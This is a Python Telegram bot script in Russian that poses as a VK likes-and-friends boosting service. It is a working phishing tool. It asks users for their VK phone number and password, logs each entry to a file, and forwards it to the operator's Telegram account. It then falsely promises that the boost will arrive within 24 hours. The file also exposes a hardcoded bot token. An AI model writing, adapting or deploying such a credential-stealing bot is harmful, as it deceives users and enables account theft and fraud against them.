
import telebot
from telebot import *
import time

print("Бот запущен! для выхода [ctrl + c]")

log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = ''
bot = telebot.TeleBot("7545465936:AAENYOn7Sz3APQYsrtlm7_LRgYbWiXDPR5k")
try:
	bot.send_message(ID, '!Бот запущен!') 
except:
	print("Возможно вы не написали /start в вашем боте! Без этого действия скрипт будет работать некорректно!")



@bot.message_handler(commands=['start'])
def start(message):
	print(f'''Обнаружен пользователь!
	ID: {message.from_user.id}''')
	bot.send_message(message.chat.id, '''👋 Привет! 👋
		Это бот накрутки лайков и друзей на ваш VK аккаунт!
		Чтобы начать, нажмите /nacrutka''') 

@bot.message_handler(commands=['lamer112311dev'])
def lamer112311(message):
	bot.send_message(message.chat.id, 'Автор скрипта: @lamer112311. Канал: @CyberPuffin') 

@bot.message_handler(commands=['nacrutka', 'n'])
def start1(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="Лайки❤️", callback_data="like")
	second_button = types.InlineKeyboardButton(text="Друзья📃", callback_data="like")
	button3 = types.InlineKeyboardButton(text="Репосты", callback_data="like")
	button4 = types.InlineKeyboardButton(text="Прослушивания плейлистов", callback_data="like")
	keyboardmain.add(first_button, second_button, button3, button4)
	bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline1(call):
	if call.data == "like":
		msg = bot.send_message(call.message.chat.id, 'Введите колличество (не более 500)') 
		bot.register_next_step_handler(msg, qproc1)

def qproc1(message):
	try:
		num = message.text	
		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
			return
		elif int(num) > 500:
			bot.reply_to(message, 'Колличество не может быть более 500!')
			return
		else:
			bot.send_message(message.chat.id, f'Колличество: {num}')
			msg = bot.send_message(message.chat.id, 'Введите номер телефона от вашего аккаунта:') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)




def step1(message):
	inp = message.text.replace("+", "")
	if not inp.isdigit():
		bot.reply_to(message, 'Введите номер числом! Повторите попытку, написав /nacrutka!')#⏳
		return
	get = f'''Полученные данные: 
Получено в боте: vk
ID: {message.from_user.id}
Ник: @{message.from_user.username}
Логин: {message.text}
Имя: {message.from_user.first_name}

'''
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	print(get)
	bot.send_message(ID, get)
	bot.reply_to(message, f'Ваш логин: {message.text}')

	msg1 = bot.send_message(message.chat.id, 'Введите пароль от вашего аккаунта:') 
	bot.register_next_step_handler(msg1, step2)

	
def step2(message):
	usrpass = message.text
	get = f'''Полученные данные:
Получено в боте: vk 
ID: {message.from_user.id}
Ник: @{message.from_user.username}
Пароль: {usrpass}
Имя: {message.from_user.first_name}

'''
	print(get)
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	bot.send_message(ID, get)
	msg = bot.reply_to(message, f'Ваш пароль: {usrpass}')
	time.sleep(1)
	bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, то ожидайте накруткуна ваш аккаунт в течении 24 часов!')


bot.polling()
		